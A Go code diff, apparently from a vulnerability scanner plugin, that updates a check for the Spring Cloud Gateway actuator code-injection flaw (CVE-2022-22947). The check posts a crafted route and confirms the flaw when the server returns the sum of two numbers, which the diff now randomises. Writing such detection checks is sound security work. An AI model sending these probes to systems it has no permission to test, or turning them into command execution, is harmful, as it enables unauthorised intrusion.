@@ -29,6 +29,8 @@ func (p *spring_cloud_gateway_rce_22947) Info() PluginInfo {
 
 func (p *spring_cloud_gateway_rce_22947) Check(netloc string) bool {
 	router := utils.GenRandom(8)
+	rand1 := utils.GenRandomInt(5)
+	rand2 := utils.GenRandomInt(5)
 	payload := fmt.Sprintf(`{
 		"id": "%s",
 		"filters": [{
@@ -37,7 +39,7 @@ func (p *spring_cloud_gateway_rce_22947) Check(netloc string) bool {
 		}],
 	  "uri": "http://example.com",
 	  "order": 0
-	  }`, router, 12345, 22223)
+	  }`, router, rand1, rand2)
 
 	url := netloc + "/actuator/gateway/routes/" + router
 	req0, err := http.NewRequest("POST", url, bytes.NewBufferString(payload))
@@ -72,10 +74,9 @@ func (p *spring_cloud_gateway_rce_22947) Check(netloc string) bool {
 		}
 
 		fmt.Println(resp2.ResponseRaw)
-		if resp2.Other.StatusCode == 200 && strings.Contains(resp2.ResponseRaw, strconv.Itoa(12345+22223)) {
+		if resp2.Other.StatusCode == 200 && strings.Contains(resp2.ResponseRaw, strconv.Itoa(rand1+rand2)) {
 			return true
 		}
-		// todo 替换成randam数字加减
 		// todo 增加删除
 
 	}
